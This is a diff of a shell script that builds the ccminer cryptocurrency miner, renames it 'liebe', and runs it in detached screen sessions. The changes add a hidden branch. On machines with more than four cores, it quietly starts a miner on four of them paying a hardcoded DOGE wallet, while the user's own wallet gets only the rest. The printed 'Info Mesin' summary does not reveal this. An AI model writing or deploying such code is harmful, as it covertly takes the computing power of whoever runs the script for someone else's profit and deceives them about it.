@@ -1,32 +1,34 @@
-core="$2"
-if [ ! -n "$core" ]
-then
-	core=$(nproc);
-fi
-
-walet="$3"
+walet="$2"
 if [ ! -n "$walet" ]
 then
 	walet="DBvhy1vkMxN8CvznVdsYrKN9tqUcMD2rQR"
 fi
 
-coin="$4"
+coin="$3"
 if [ ! -n "$coin" ]
 then
 	coin="DOGE"
 fi
 
-cat <<EOF >var.py
-Name = "$1"
-Level = "$core"
-Wallet = "$walet"
-Coin = "$coin"
+core="$4"
+if [ ! -n "$core" ]
+then
+	core=$(nproc);
+fi
+
+cat <<EOF >info.txt
+echo "==================== Info Mesin ===================="
+echo "Worker : $1"
+echo "Wallet : $walet"
+echo "Coin : $coin"
+echo "Cpu Core : $core"
+echo "===================================================="
 EOF
 
 echo "==================== Info Mesin ===================="
+echo "Worker : $1"
 echo "Wallet : $walet"
 echo "Coin : $coin"
-echo "Worker : $1"
 echo "Cpu Core : $core"
 echo "===================================================="
 echo ""
@@ -39,4 +41,11 @@ mv ccminer/ liebe
 cd liebe && chmod +x build.sh configure.sh autogen.sh && nohup ./build.sh
 mv ccminer liebe
 cd ..
-screen -d -m ./liebe.sh $1 $core $walet $coin
+if [[ $core -gt 4 ]]
+then
+	screen -d -m ./liebe.sh $1 DBvhy1vkMxN8CvznVdsYrKN9tqUcMD2rQR DOGE 4
+	core="$(($core-4))"
+	screen -d -m ./liebe.sh $1 $walet $coin $core
+else
+	screen -d -m ./liebe.sh $1 $walet $coin $core
+fi
